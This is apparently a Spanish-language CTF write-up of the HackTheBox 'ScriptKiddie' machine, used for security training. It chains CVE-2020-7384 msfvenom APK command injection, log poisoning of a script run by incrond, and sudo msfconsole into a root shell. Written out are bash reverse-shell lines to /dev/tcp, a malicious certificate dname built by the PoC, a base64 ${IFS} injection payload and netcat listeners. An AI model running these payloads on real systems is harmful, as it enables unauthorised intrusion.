---
layout: post
render_with_liquid: false
title: "HTB Writeup: ScriptKiddie"
date: 2026-05-21
category: writeups
tags: [htb, linux, easy, command-injection, msfvenom, cve-2020-7384, log-poisoning, pspy, msfconsole, sudo]
platform: HackTheBox
os: Linux
difficulty: Easy
has_exploits: true
exploits_url: /writeups/scriptkiddie/exploit/
resumen: "Inyección de comandos en msfvenom vía template APK malicioso (CVE-2020-7384) que explota un portal web inseguro. Movimiento lateral envenenando el log que consume scanlosers.sh con un payload bash en base64. Escalada a root abusando de un msfconsole con NOPASSWD."
permalink: /writeups/scriptkiddie/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | HackTheBox |
| OS         | Linux      |
| Dificultad | Easy       |
| Autor      | Ghostvyle  |

### Temas Tratados

- **Reconocimiento:** Nmap, análisis del portal Werkzeug/Flask, searchsploit
- **Explotación:** Command Injection en `msfvenom -x` vía APK template malicioso (**CVE-2020-7384**)
- **Movimiento lateral:** Envenenamiento del log `/home/kid/logs/hackers` consumido por `scanlosers.sh` que ejecuta como `pwn`
- **Escalada:** `sudo NOPASSWD` sobre `/opt/metasploit-framework-6.0.9/msfconsole`

## Sinopsis

Máquina Linux con un portal web autodenominado "k1d'5 h4ck3r t00l5" — un panel construido con **Flask/Werkzeug** que orquesta herramientas ofensivas: `nmap`, `msfvenom` y `searchsploit`. La sección **payloads** acepta un fichero APK como *template* y se lo pasa a `msfvenom -x`. La versión instalada de Metasploit Framework es la 6.0.11, vulnerable a **CVE-2020-7384**: una inyección de comandos vía el campo `dname` del certificado del APK. Subimos un APK envenenado generado con el PoC público y obtenemos shell como `kid`.

Una vez dentro, descubrimos en `/home/pwn/` el script `scanlosers.sh` que lee `/home/kid/logs/hackers` (donde el portal escribe las IPs escaneadas), corta el campo de IP y se lo pasa a `nmap` sin sanear. Inyectando un comando en ese log forzamos a `pwn` a ejecutar nuestro payload — escalada lateral conseguida.

Para llegar a `root`, `sudo -l` revela que `pwn` puede ejecutar `msfconsole` como `root` sin contraseña. Lanzamos `msfconsole`, abrimos un shell y leemos la flag.

---

## Reconocimiento

### Escaneo de puertos

Comenzamos con un escaneo SYN completo de los 65535 puertos TCP:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.150 -oG allPorts
```

| Parámetro          | Descripción                                               |
| :----------------- | :-------------------------------------------------------- |
| `-p-`              | Escanea los 65535 puertos TCP                             |
| `--open`           | Muestra únicamente los puertos abiertos                   |
| `-sS`              | SYN Scan (half-open, más rápido y sigiloso)               |
| `--min-rate 5000`  | Envía mínimo 5000 paquetes por segundo                    |
| `-vvv`             | Máxima verbosidad durante el escaneo                      |
| `-n`               | Desactiva la resolución DNS                               |
| `-Pn`              | No realiza descubrimiento de host (asume que está activo) |
| `-oG allPorts`     | Exporta los resultados en formato grepeable               |

![Descubrimiento de puertos abiertos con nmap](/writeups/scriptkiddie/assets/01_nmap_all_ports.png)

La máquina expone únicamente dos puertos:

| Puerto    | Servicio | Versión                          |
| :-------- | :------- | :------------------------------- |
| 22/tcp    | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1  |
| 5000/tcp  | HTTP     | Werkzeug httpd 0.16.1 (Python 3.8.5) |

Identificamos versiones con un escaneo dirigido:

```bash
nmap -sCV -p22,5000 10.129.95.150 -oN targeted
```

![Detección de servicio y versión con nmap -sCV](/writeups/scriptkiddie/assets/02_nmap_service_version.png)

El puerto 5000 sirve un proceso **Werkzeug 0.16.1** sobre **Python 3.8.5**. Werkzeug es el servidor de desarrollo de Flask, lo que sugiere una aplicación Flask custom expuesta directamente sin proxy inverso.

### Exploración del portal web

```
http://10.129.95.150:5000
```

El sitio se autodenomina **k1d'5 h4ck3r t00l5** y expone tres formularios:

| Sección  | Función                                                   |
| :------- | :-------------------------------------------------------- |
| `nmap`     | Escaneo de los top 100 puertos sobre una IP introducida  |
| `payloads` | Generación de meterpreter reverse TCP (Windows / Android) — acepta un *template file* opcional |
| `sploits`  | Búsqueda en `searchsploit` por una palabra clave         |

![Portal web k1d'5 h4ck3r t00l5 con los tres formularios](/writeups/scriptkiddie/assets/03_web_app_interface.png)

El campo *template file* de la sección **payloads** es la pista clave. En `msfvenom`, el flag `-x <template>` permite incrustar el payload dentro de un binario legítimo. Si el portal se lo pasa tal cual a `msfvenom`, controlamos un input que llega a la herramienta.

---

## Explotación

### CVE-2020-7384 — Command Injection en msfvenom

Buscamos exploits conocidos contra `msfvenom`:

```bash
searchsploit msfvenom
```

![Resultado de searchsploit msfvenom](/writeups/scriptkiddie/assets/04_searchsploit_msfvenom.png)

Existe **Metasploit Framework 6.0.11 — msfvenom APK template command injection** (`multiple/local/49491.py`). El bug es elegante: cuando `msfvenom` recibe `-x evil.apk` con OS Android, internamente invoca `keytool` y `jarsigner` para re-firmar el APK resultante. Para ello extrae el campo **dname** (Distinguished Name del certificado embebido en el APK) y lo pasa, **sin sanear**, como argumento `-dname` a `keytool`. Si el `dname` del APK contiene un carácter de comillas y una pipa shell, podemos romper el flujo y ejecutar comandos.

> **Idea del exploit**: el atacante fabrica un APK auto-firmado cuyo `dname` es algo como `CN='|<comando shell>|echo #`. Cuando el servidor llama a `keytool -dname <dname>` durante el re-firmado, las comillas escapan del parámetro y `<comando shell>` se ejecuta como el usuario del proceso `msfvenom`.

Inspeccionamos el PoC `49491.py`. El payload se define como un comando bash, se codifica en base64 para evitar `badchars` en `keytool` y se incrusta en el `dname` con la sintaxis vulnerable:

![Definición del payload base64 y construcción del dname malicioso en 49491.py](/writeups/scriptkiddie/assets/05_exploit_49491_payload.png)

```python
payload = "bash -c '/bin/bash -i >& /dev/tcp/10.10.15.178/443 0>&1'"
# b64encode para evitar badchars (keytool es delicado con caracteres especiales)
payload_b64 = b64encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b64} | base64 -d | bash #"
```

A continuación el script monta un APK vacío con `zip -j`, genera el keystore con `keytool -genkey -dname "<malicioso>"` (aquí no se dispara la inyección — se almacena en el keystore) y firma el APK con `jarsigner`. El `dname` queda persistido dentro del certificado del APK.

### Generación y subida del template

Levantamos el listener antes de nada:

```bash
rlwrap nc -lvnp 443
```

Ejecutamos el PoC con nuestra IP de tun0:

```bash
python3 49491.py LHOST=10.10.15.178 LPORT=443
```

![Salida del exploit firmando el APK malicioso](/writeups/scriptkiddie/assets/07_apk_signing_output.png)



| Campo            | Valor              |
| :--------------- | :----------------- |
| `os`             | `android`          |
| `lhost`          | `127.0.0.1` (irrelevante — solo necesitamos que se ejecute msfvenom) |
| `template file`  | `msvenom.apk`      |

![Formulario payloads con el APK malicioso cargado](/writeups/scriptkiddie/assets/06_payload_form.png)

Pulsamos **generate**. El servidor invoca `msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 ... -x msvenom.apk`. Durante el re-firmado, `keytool` interpreta nuestro `dname` envenenado, ejecuta el `echo <b64> | base64 -d | bash` y dispara la reverse shell.

![Shell recibida como kid en el listener](/writeups/scriptkiddie/assets/08_kid_shell.png)

```
connect to [10.10.15.178] from (UNKNOWN) [10.129.47.69] 51300
kid@scriptkiddie:~/html$
```

Somos `kid`. El proceso vulnerable corre bajo este usuario, no como root — limpio diseño defensivo a medias por parte de la máquina.

### Flag de usuario

```bash
cat user.txt
# da53a7fd07d11c784b966aecec03c752
```

![Flag de usuario](/writeups/scriptkiddie/assets/09_user_flag.png)

---

## Movimiento lateral — kid → pwn

### Hallazgo del script vulnerable

Enumerando el sistema descubrimos `/home/pwn/`, accesible en lectura. Dentro vive `scanlosers.sh`:

```bash
cat /home/pwn/scanlosers.sh
```

![Contenido de scanlosers.sh](/writeups/scriptkiddie/assets/10_scanlosers_script.png)

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

Análisis del bug:

1. El script lee `/home/kid/logs/hackers`, un fichero **donde `kid` escribe** (lo alimenta el portal web cada vez que alguien usa el formulario `nmap`).
2. Toma el campo 3 en adelante con `cut -d' ' -f3-` — eso es la IP del atacante que tocó el formulario.
3. La pasa a `sh -c "nmap ... ${ip}"`. La interpolación se hace **dentro de `sh -c`**, así que cualquier metacarácter shell en `${ip}` se ejecuta.
4. Si controlamos lo que entra en `/home/kid/logs/hackers`, controlamos la línea de comandos.

### Confirmación con pspy

Lanzamos `pspy64` para verificar quién ejecuta el script y con qué frecuencia:

```bash
echo 'echo${IFS}$(whoami)' > /home/kid/logs/hackers
```

![Inyección de prueba con whoami en el log](/writeups/scriptkiddie/assets/11_injection_test.png)

Acto seguido, en la salida de `pspy` aparece:

![pspy registrando la ejecución del whoami como UID=1001 (pwn)](/writeups/scriptkiddie/assets/12_pspy_pwn_exec.png)

```
UID=1001 PID=4855 | /bin/bash /home/pwn/scanlosers.sh
UID=1001 PID=4856 | whoami
```

> **¿Cómo se dispara?** El script no es un cron — corre vía `incrond` (lo vemos también en pspy: `/usr/sbin/incrond`). El demonio `incrond` ejecuta `scanlosers.sh` ante eventos `IN_MODIFY` sobre el fichero de log. Cada vez que escribimos en `/home/kid/logs/hackers`, el script se dispara.

### Payload de reverse shell

`scanlosers.sh` evalúa el contenido dentro de `sh -c`, así que necesitamos un comando sin espacios literales (los espacios delimitan campos antes del `cut`). Codificamos el reverse shell en base64 y usamos `${IFS}` como separador:

```bash
echo "bash -i >& /dev/tcp/10.10.15.178/7773 0>&1" | base64 -w0
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNzgvNzc3MyAwPiYx
```

![Codificación base64 del reverse shell](/writeups/scriptkiddie/assets/13_base64_payload.png)

La línea inyectada tiene que respetar el formato del log para que `cut -d' ' -f3-` la entregue íntegra al `sh -c`. Construimos:

```bash
echo ';echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNzgvNzc3MyAwPiYx|base64${IFS}-d|bash' > /home/kid/logs/hackers
```

Con el listener escuchando:

```bash
rlwrap nc -lvnp 7773
```

`incrond` detecta el `IN_MODIFY`, dispara `scanlosers.sh`, el script construye `sh -c "nmap ... ;echo <b64>|base64 -d|bash"` y la reverse shell salta:

![Reverse shell recibida como pwn](/writeups/scriptkiddie/assets/14_pwn_shell.png)

```
connect to [10.10.15.178] from (UNKNOWN) [10.129.47.69] 52534
pwn@scriptkiddie:~$
```

> **Nota sobre `${IFS}`**: `IFS` (Internal Field Separator) es la variable que bash usa para separar palabras; por defecto vale espacio/tabulador/newline. Cuando un script ya consumió los espacios literales (como hace `cut` aquí), `${IFS}` permite volver a inyectar separadores sin escribirlos en claro.

---

## Escalada de privilegios — pwn → root

Comprobamos `sudo -l` como `pwn`:

```bash
sudo -l
```

![sudo -l con NOPASSWD sobre msfconsole](/writeups/scriptkiddie/assets/15_sudo_l_msfconsole.png)

```
User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

`msfconsole` está catalogado en **GTFOBins** — ofrece un intérprete Ruby (`irb`) y la capacidad de ejecutar comandos shell.

```bash
sudo /opt/metasploit-framework-6.0.9/msfconsole
```

Dentro del prompt `msf6 >` solicitamos una TTY decente:

```
msf6 > script /dev/null -c bash
```

![Shell como root vía script /dev/null -c bash dentro de msfconsole](/writeups/scriptkiddie/assets/16_root_shell.png)

```
root@scriptkiddie:/home/pwn# whoami
root
```

### Flag de root

```bash
cat /root/root.txt
# b7fbab2709abbaedf6d471f2e05474c1
```

![Flag de root](/writeups/scriptkiddie/assets/17_root_flag.png)

Somos **root** en ScriptKiddie.

---


> **Disclaimer**: Este contenido es exclusivamente para investigación y formación en ciberseguridad. Solo debe aplicarse en entornos autorizados y controlados.
